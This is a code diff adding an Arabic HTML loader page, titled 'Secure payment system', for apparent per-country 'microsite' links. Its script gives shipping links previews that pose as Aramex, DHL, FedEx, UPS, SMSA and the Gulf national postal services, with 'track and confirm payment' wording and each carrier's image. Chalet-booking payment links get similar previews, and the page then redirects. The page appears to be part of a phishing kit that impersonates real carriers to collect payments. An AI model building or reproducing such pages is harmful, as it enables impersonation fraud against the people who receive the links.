@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0EA5E9" />
+  
+  <!-- Basic Meta Tags -->
+  <title id="page-title">نظام الدفع الآمن</title>
+  <meta name="description" id="page-description" content="منصة موحدة لجميع دول الخليج - حجز الشاليهات، خدمات الشحن، والمزيد" />
+  <meta name="author" content="Gulf Unified Platform" />
+  
+  <!-- Open Graph / Facebook / WhatsApp -->
+  <meta property="og:type" content="website" />
+  <meta property="og:url" id="og-url" content="" />
+  <meta property="og:title" id="og-title" content="نظام الدفع الآمن" />
+  <meta property="og:description" id="og-description" content="منصة موحدة لجميع دول الخليج - حجز الشاليهات، خدمات الشحن، والمزيد" />
+  <meta property="og:image" id="og-image" content="/og-aramex.jpg" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta property="og:image:type" content="image/jpeg" />
+  <meta property="og:site_name" content="نظام الدفع الآمن" />
+  <meta property="og:locale" content="ar_AR" />
+  
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:url" id="twitter-url" content="" />
+  <meta name="twitter:title" id="twitter-title" content="نظام الدفع الآمن" />
+  <meta name="twitter:description" id="twitter-description" content="منصة موحدة لجميع دول الخليج - حجز الشاليهات، خدمات الشحن، والمزيد" />
+  <meta name="twitter:image" id="twitter-image" content="/og-aramex.jpg" />
+  <meta name="twitter:image:alt" id="twitter-image-alt" content="نظام الدفع الآمن" />
+  
+  <!-- Additional SEO -->
+  <meta name="robots" content="index, follow" />
+  <meta name="language" content="Arabic" />
+  <link rel="canonical" id="canonical-url" href="" />
+  
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Almarai:wght@300;400;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    body {
+      font-family: 'Almarai', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #0EA5E9, #06B6D4);
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .loading {
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+  </style>
+</head>
+<body>
+  <div class="loading">
+    <h1 style="font-size: 2rem; margin-bottom: 1rem;">جاري التحميل...</h1>
+    <p>نظام الدفع الآمن</p>
+  </div>
+  
+  <script>
+    // Service data mapping
+    const serviceData = {
+      aramex: {
+        name: "أرامكس - Aramex",
+        description: "شركة رائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة",
+        ogImage: "/og-aramex.jpg"
+      },
+      dhl: {
+        name: "دي إتش إل - DHL", 
+        description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
+        ogImage: "/og-dhl.jpg"
+      },
+      fedex: {
+        name: "فيديكس - FedEx",
+        description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات", 
+        ogImage: "/og-fedex.jpg"
+      },
+      ups: {
+        name: "يو بي إس - UPS",
+        description: "حلول لوجستية متكاملة وخدمات شحن سريعة حول العالم",
+        ogImage: "/og-ups.jpg"
+      },
+      empost: {
+        name: "البريد الإماراتي - Emirates Post",
+        description: "المشغل الوطني للبريد في دولة الإمارات العربية المتحدة",
+        ogImage: "/og-empost.jpg"
+      },
+      smsa: {
+        name: "سمسا - SMSA",
+        description: "أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية",
+        ogImage: "/og-smsa.jpg"
+      },
+      zajil: {
+        name: "زاجل - Zajil",
+        description: "شركة سعودية رائدة في خدمات البريد السريع والشحن",
+        ogImage: "/og-zajil.jpg"
+      },
+      naqel: {
+        name: "ناقل - Naqel", 
+        description: "حلول شحن متطورة وخدمات لوجستية متكاملة داخل المملكة",
+        ogImage: "/og-naqel.jpg"
+      },
+      saudipost: {
+        name: "البريد السعودي - Saudi Post",
+        description: "المشغل الوطني للبريد في المملكة العربية السعودية",
+        ogImage: "/og-saudipost.jpg"
+      },
+      kwpost: {
+        name: "البريد الكويتي - Kuwait Post",
+        description: "المشغل الوطني للبريد في دولة الكويت",
+        ogImage: "/og-kwpost.jpg"
+      },
+      qpost: {
+        name: "البريد القطري - Qatar Post",
+        description: "المشغل الوطني للبريد في دولة قطر",
+        ogImage: "/og-qpost.jpg"
+      },
+      omanpost: {
+        name: "البريد العُماني - Oman Post",
+        description: "المشغل الوطني للبريد في سلطنة عُمان",
+        ogImage: "/og-omanpost.jpg"
+      },
+      bahpost: {
+        name: "البريد البحريني - Bahrain Post",
+        description: "المشغل الوطني للبريد في مملكة البحرين",
+        ogImage: "/og-bahpost.jpg"
+      }
+    };
+
+    // Country data mapping
+    const countryData = {
+      AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
+      SA: { nameAr: "المملكة العربية السعودية", name: "Saudi Arabia" },
+      KW: { nameAr: "دولة الكويت", name: "Kuwait" },
+      QA: { nameAr: "دولة قطر", name: "Qatar" },
+      OM: { nameAr: "سلطنة عُمان", name: "Oman" },
+      BH: { nameAr: "مملكة البحرين", name: "Bahrain" }
+    };
+
+    function updateMetaTags() {
+      const url = new URL(window.location.href);
+      const path = url.pathname;
+      
+      // Check if this is a microsite route: /r/:country/:type/:id
+      const micrositeMatch = path.match(/^\/r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)$/);
+      
+      if (!micrositeMatch) {
+        // Not a microsite route, redirect to main app
+        window.location.href = '/';
+        return;
+      }
+      
+      const [, countryCode, type, id] = micrositeMatch;
+      const country = countryData[countryCode];
+      
+      if (!country) {
+        window.location.href = '/';
+        return;
+      }
+      
+      let title = "";
+      let description = "";
+      let ogImage = "/og-aramex.jpg";
+      
+      if (type === "shipping") {
+        // For shipping, try to get service info from URL parameters or use default
+        const serviceKey = url.searchParams.get('service') || 'aramex';
+        const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
+        
+        title = `تتبع وتأكيد الدفع - ${serviceInfo.name}`;
+        description = `${serviceInfo.description} - تتبع شحنتك وأكمل الدفع بشكل آمن`;
+        ogImage = serviceInfo.ogImage;
+      } else if (type === "chalet") {
+        // For chalet links
+        title = `حجز شاليه في ${country.nameAr}`;
+        description = `احجز شاليه أحلامك في ${country.nameAr} - نظام دفع آمن ومحمي`;
+        ogImage = "/og-aramex.jpg";
+      }
+      
+      const siteUrl = `${url.protocol}//${url.host}`;
+      const fullUrl = url.href;
+      const fullOgImage = ogImage.startsWith('http') ? ogImage : `${siteUrl}${ogImage}`;
+      
+      // Update meta tags
+      document.getElementById('page-title').textContent = title;
+      document.getElementById('page-description').setAttribute('content', description);
+      document.getElementById('og-url').setAttribute('content', fullUrl);
+      document.getElementById('og-title').setAttribute('content', title);
+      document.getElementById('og-description').setAttribute('content', description);
+      document.getElementById('og-image').setAttribute('content', fullOgImage);
+      document.getElementById('twitter-url').setAttribute('content', fullUrl);
+      document.getElementById('twitter-title').setAttribute('content', title);
+      document.getElementById('twitter-description').setAttribute('content', description);
+      document.getElementById('twitter-image').setAttribute('content', fullOgImage);
+      document.getElementById('twitter-image-alt').setAttribute('content', title);
+      document.getElementById('canonical-url').setAttribute('href', fullUrl);
+      
+      // Redirect to actual app after a short delay to ensure meta tags are processed
+      setTimeout(() => {
+        window.location.href = fullUrl;
+      }, 1000);
+    }
+
+    // Run on page load
+    updateMetaTags();
+  </script>
+</body>
+</html>
